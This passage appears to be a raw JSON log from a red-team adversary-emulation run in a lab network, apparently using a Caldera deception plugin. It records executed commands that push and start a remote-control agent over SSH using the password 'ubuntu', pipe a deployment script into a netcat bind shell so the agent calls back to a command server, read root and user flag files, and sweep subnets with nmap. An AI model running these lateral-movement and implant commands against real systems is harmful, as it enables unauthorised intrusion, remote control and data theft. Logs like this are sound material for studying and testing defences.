"2023-10-03T20:20:20Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "98ee8ddb-061e-4e61-863c-8948a2437702", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux database@192.168.201.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 database@192.168.201.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["sucxhr"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-03T20:20:17Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["sucxhr"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "database", "unique": "host.lateralMove.userdatabase", "created": "2023-10-03T20:20:17Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["sucxhr"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.3", "unique": "host.lateralMove.ip192.168.201.3", "created": "2023-10-03T20:20:17Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["sucxhr"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-03T20:20:17Z", "relationships": []}], "unique": "98ee8ddb-061e-4e61-863c-8948a2437702", "decide": "2023-10-03T20:20:17Z", "status": 1, "score": 15, "pid": "23781", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "sucxhr", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-03T20:20:17Z", "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux database@192.168.201.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 database@192.168.201.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["98ee8ddb-061e-4e61-863c-8948a2437702"], "collected_by": ["sucxhr"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.3", "unique": "host.ip.address192.168.201.3", "created": "2023-10-03T20:20:20Z", "relationships": []}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:20:17Z"}, {"deadman": false, "finish": "2023-10-03T20:20:35Z", "executor": {"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "2b4085dc-1ae6-4bb2-ba42-e7952734b6e4", "plaintext_command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.201.3 4444", "used": [{"trait": "host.lateralMove.ip", "links": [], "collected_by": ["sucxhr"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.3", "unique": "host.lateralMove.ip192.168.201.3", "created": "2023-10-03T20:20:22Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["sucxhr"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "4444", "unique": "host.lateralMove.port4444", "created": "2023-10-03T20:20:22Z", "relationships": []}], "unique": "2b4085dc-1ae6-4bb2-ba42-e7952734b6e4", "decide": "2023-10-03T20:20:22Z", "status": 1, "score": 3, "pid": "24462", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "sucxhr", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ncshell", "executors": [{"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T9090", "name": "Deception download agent on target through netcat bind shell", "description": "download sandcat agent on a target machine that is listening on a netcat bind shell", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: Netcat Bind Shell"}, "agent_reported_time": "2023-10-03T20:20:29Z", "command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.201.3 4444", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:20:29Z"}, {"deadman": false, "finish": "2023-10-03T20:20:39Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "aef8deca-9157-4857-b53b-aeac14bae25e", "plaintext_command": "ls -l /home", "used": [{"trait": "host.dir.path", "links": [], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:20:37Z", "relationships": []}], "unique": "aef8deca-9157-4857-b53b-aeac14bae25e", "decide": "2023-10-03T20:20:37Z", "status": 0, "score": 1, "pid": "1497", "relationships": [{"target": {"trait": "host.dir.children", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["database"], "unique": "host.dir.children['database']", "created": "2023-10-03T20:20:39Z", "relationships": []}, "source": {"trait": "host.dir.path", "links": [], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:20:37Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7214600a0>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e8610>", "score": 1}], "host": "database-host", "pin": 0, "paw": "tvtjgt", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-ls", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.dir.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.children"}]}], "buckets": ["utility"], "technique_name": "Deception Enum Folders"}, "agent_reported_time": "2023-10-03T20:20:39Z", "command": "ls -l /home", "facts": [{"trait": "host.dir.path", "links": ["19cc0345-4438-4e04-800e-6fc0748c9a57", "05fa8018-1547-4fba-9952-17d7b6f03be9", "cccc83db-77f8-4bc0-9e57-20508952a595", "54ad2d75-1d24-4e29-ab32-8b4b75ca53a9", "aef8deca-9157-4857-b53b-aeac14bae25e"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:12:55Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['finance'])", "host.dir.path(/home) : has_contents : host.dir.children(['ceo'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])", "host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}, {"trait": "host.dir.children", "links": ["aef8deca-9157-4857-b53b-aeac14bae25e"], "collected_by": ["tvtjgt"], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": "T9012", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["database"], "unique": "host.dir.children['database']", "created": "2023-10-03T20:20:39Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:20:39Z"}, {"deadman": false, "finish": "2023-10-03T20:20:45Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "23b46514-6903-4b86-893b-ea66a6d4c941", "plaintext_command": "cat /home/database/flag.txt", "used": [{"trait": "host.file.path", "links": ["23b46514-6903-4b86-893b-ea66a6d4c941"], "collected_by": ["tvtjgt"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home/database/flag.txt", "unique": "host.file.path/home/database/flag.txt", "created": "2023-10-03T20:20:42Z", "relationships": ["host.file.path(/home/database/flag.txt) : has_contents : host.file.contents(F2LQBOEO97MLMKQ4A3NLPM7SW2ON2XTH)"]}], "unique": "23b46514-6903-4b86-893b-ea66a6d4c941", "decide": "2023-10-03T20:20:42Z", "status": 0, "score": 1, "pid": "1499", "relationships": [{"target": {"trait": "host.file.contents", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "F2LQBOEO97MLMKQ4A3NLPM7SW2ON2XTH", "unique": "host.file.contentsF2LQBOEO97MLMKQ4A3NLPM7SW2ON2XTH", "created": "2023-10-03T20:20:45Z", "relationships": []}, "source": {"trait": "host.file.path", "links": ["23b46514-6903-4b86-893b-ea66a6d4c941"], "collected_by": ["tvtjgt"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home/database/flag.txt", "unique": "host.file.path/home/database/flag.txt", "created": "2023-10-03T20:20:42Z", "relationships": ["host.file.path(/home/database/flag.txt) : has_contents : host.file.contents(F2LQBOEO97MLMKQ4A3NLPM7SW2ON2XTH)"]}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720e9e980>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe7208a2860>", "score": 1}], "host": "database-host", "pin": 0, "paw": "tvtjgt", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-03T20:20:45Z", "command": "cat /home/database/flag.txt", "facts": [{"trait": "host.file.path", "links": ["23b46514-6903-4b86-893b-ea66a6d4c941"], "collected_by": ["tvtjgt"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home/database/flag.txt", "unique": "host.file.path/home/database/flag.txt", "created": "2023-10-03T20:20:42Z", "relationships": ["host.file.path(/home/database/flag.txt) : has_contents : host.file.contents(F2LQBOEO97MLMKQ4A3NLPM7SW2ON2XTH)"]}, {"trait": "host.file.contents", "links": ["23b46514-6903-4b86-893b-ea66a6d4c941"], "collected_by": ["tvtjgt"], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": "T9000", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "F2LQBOEO97MLMKQ4A3NLPM7SW2ON2XTH", "unique": "host.file.contentsF2LQBOEO97MLMKQ4A3NLPM7SW2ON2XTH", "created": "2023-10-03T20:20:45Z", "relationships": ["host.file.path(/home/database/flag.txt) : has_contents : host.file.contents(F2LQBOEO97MLMKQ4A3NLPM7SW2ON2XTH)"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:20:45Z"}, {"deadman": false, "finish": "2023-10-03T20:20:52Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "d8464326-17de-4a78-9d18-c84ce550a37b", "plaintext_command": "cat /root/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["piiiry", "hchyiu", "tvtjgt"], "score": 3, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-03T20:20:47Z", "relationships": []}], "unique": "d8464326-17de-4a78-9d18-c84ce550a37b", "decide": "2023-10-03T20:20:47Z", "status": 0, "score": 1, "pid": "1501", "relationships": [{"target": {"trait": "host.file.contents", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "Y304GQRQKHK63BNJSPHGQAVORNG65LNH", "unique": "host.file.contentsY304GQRQKHK63BNJSPHGQAVORNG65LNH", "created": "2023-10-03T20:20:52Z", "relationships": []}, "source": {"trait": "host.file.path", "links": [], "collected_by": ["piiiry", "hchyiu", "tvtjgt"], "score": 3, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-03T20:20:47Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720c8ac80>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e92d0>", "score": 1}], "host": "database-host", "pin": 0, "paw": "tvtjgt", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-03T20:20:52Z", "command": "cat /root/flag.txt", "facts": [{"trait": "host.file.path", "links": ["5bcb3960-cc39-4bc8-b34f-59eeb0f64d39", "d8464326-17de-4a78-9d18-c84ce550a37b"], "collected_by": ["piiiry", "hchyiu", "tvtjgt"], "score": 3, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-03T20:13:05Z", "relationships": ["host.file.path(/root/flag.txt) : has_contents : host.file.contents(RSFUG7QFN354XFQOVAJCCL230YP3EY1Q)", "host.file.path(/root/flag.txt) : has_contents : host.file.contents(Y304GQRQKHK63BNJSPHGQAVORNG65LNH)"]}, {"trait": "host.file.contents", "links": ["d8464326-17de-4a78-9d18-c84ce550a37b"], "collected_by": ["tvtjgt"], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": "T9000", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "Y304GQRQKHK63BNJSPHGQAVORNG65LNH", "unique": "host.file.contentsY304GQRQKHK63BNJSPHGQAVORNG65LNH", "created": "2023-10-03T20:20:52Z", "relationships": ["host.file.path(/root/flag.txt) : has_contents : host.file.contents(Y304GQRQKHK63BNJSPHGQAVORNG65LNH)"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:20:52Z"}, {"deadman": false, "finish": "2023-10-03T20:21:08Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "967a21f4-6081-48c4-b87e-fe4a2857c58a", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "scan.subnet.addr192.168.200.0/24", "created": "2023-10-03T20:20:52Z", "relationships": []}], "unique": "967a21f4-6081-48c4-b87e-fe4a2857c58a", "decide": "2023-10-03T20:20:52Z", "status": 0, "score": 1, "pid": "1503", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7"], "unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7']", "created": "2023-10-03T20:21:08Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-03T20:21:08Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720983c10>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe720981600>", "score": 1}], "host": "database-host", "pin": 0, "paw": "tvtjgt", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:20:58Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["b50f077a-e985-4058-aa9f-c3a1f23ab450", "f3605b9e-b642-4a08-b652-2b4c0e140fe4", "7e51a4e3-b4f0-4271-86e0-92bc8ef16bda", "97784018-c6e6-41fb-9376-7a51cc987e13", "967a21f4-6081-48c4-b87e-fe4a2857c58a"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-03T20:13:23Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.6', '192.168.200.7', '192.168.200.5'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.3'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["967a21f4-6081-48c4-b87e-fe4a2857c58a"], "collected_by": ["tvtjgt"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7"], "unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7']", "created": "2023-10-03T20:21:08Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:20:58Z"}, {"deadman": false, "finish": "2023-10-03T20:21:22Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "8f0da59b-e3d7-4006-85b4-5ae6561c9726", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "scan.subnet.addr192.168.201.0/24", "created": "2023-10-03T20:21:12Z", "relationships": []}], "unique": "8f0da59b-e3d7-4006-85b4-5ae6561c9726", "decide": "2023-10-03T20:21:12Z", "status": 0, "score": 1, "pid": "1506", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.201.1", "192.168.201.2", "192.168.201.3"], "unique": "host.subnet.online_ipaddrs['192.168.201.1', '192.168.201.2', '192.168.201.3']", "created": "2023-10-03T20:21:22Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-03T20:21:22Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720bc0af0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe720bc0d00>", "score": 1}], "host": "database-host", "pin": 0, 